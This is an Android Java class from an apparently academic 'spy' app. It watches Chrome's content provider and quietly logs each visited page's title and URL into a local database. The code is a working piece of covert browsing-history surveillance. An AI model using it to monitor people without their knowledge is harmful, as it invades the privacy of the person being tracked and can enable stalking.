package edu.uj.jkordas.spy.receiver;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;

import edu.uj.jkordas.spy.DAO.BrowserHistoryDataSource;

public class ChromeObserver extends ContentObserver {
	private Context context = null;
	private String lastTitle;
	public static String CHROME_BOOKMARKS_URI = "content://com.android.chrome.browser/bookmarks";

	public ChromeObserver(Handler handler, Context context) {
		super(handler);
		this.context = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		onChange(selfChange, null);
	}

	@Override
	public void onChange(boolean selfChange, Uri uri) {
		super.onChange(selfChange);

		Cursor cur = context.getContentResolver().query(
				Uri.parse(CHROME_BOOKMARKS_URI),
				new String[] { "title", "url" }, "bookmark = 0", null, null);

		if (cur != null) {
			if (cur.moveToLast()) {

				String currentTitle = cur.getString(cur.getColumnIndex("title"));
				if (!currentTitle.equals(lastTitle)) {

					String url = cur.getString(cur.getColumnIndex("url"));

					BrowserHistoryDataSource datasource = new BrowserHistoryDataSource(
							context);
					datasource.open();

					datasource.addVisitedPage(currentTitle, url);
					datasource.close();
				}

				this.lastTitle = currentTitle;
			}

		} else {
			Log.e("CHROME_OBSERVER", "Call Cursor is Empty");
		}
	}
}
